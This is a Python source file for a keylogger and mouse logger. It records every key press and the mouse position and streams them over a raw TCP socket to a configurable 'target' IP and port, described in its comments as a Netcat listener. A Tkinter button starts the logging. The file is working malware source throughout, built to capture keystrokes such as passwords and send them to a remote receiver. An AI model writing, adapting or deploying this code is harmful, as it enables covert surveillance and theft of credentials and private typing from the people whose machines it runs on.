import socket
import time
import threading
import pyautogui
from pynput import keyboard
import tkinter as tk

# Configuration for Netcat connection
TARGET_IP = "127.0.0.1"  # Change this to the target IP address
TARGET_PORT = 1234  # Change this to the target port

# Set up the socket connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect_to_server():
    """Connect to the server."""
    max_retries = 5
    retry_delay = 5  # seconds

    for i in range(max_retries):
        try:
            sock.connect(("127.0.0.1", 1234))
            print("Connected to the server.")
            break
        except socket.timeout:
            print(f"Connection timeout, retrying in {retry_delay} seconds...")
            time.sleep(retry_delay)
        except ConnectionRefusedError:
            print(f"Connection refused, retrying in {retry_delay} seconds...")
            time.sleep(retry_delay)

def on_press(key):
    """Log key presses and send to server."""
    try:
        sock.sendall(f'Key pressed: {key.char}\n'.encode())
    except AttributeError:
        sock.sendall(f'Special key pressed: {key}\n'.encode())

def log_mouse_movement():
    """Log mouse movement and send to server using pyautogui."""
    while True:
        x, y = pyautogui.position()
        sock.sendall(f'Mouse moved to: ({x}, {y})\n'.encode())
        time.sleep(1)  # Adjust the interval as needed

def start_logging():
    """Start both keylogger and mouse logger."""
    # Connect to the server
    connect_to_server()

    # Set up the keyboard listener
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()

    # Set up a thread for mouse logging with pyautogui
    mouse_thread = threading.Thread(target=log_mouse_movement)
    mouse_thread.start()

    # Keep the program running
    keyboard_listener.join()
    mouse_thread.join()

def create_gui():
    """Create a GUI with a button to run the script."""
    root = tk.Tk()
    root.title("Keylogger and Mouse Logger")

    button = tk.Button(root, text="Start Logging", command=lambda: threading.Thread(target=start_logging).start())
    button.pack(pady=20)

    root.mainloop()

def main():
    """Main function."""
    create_gui()

if __name__ == "__main__":
    main()
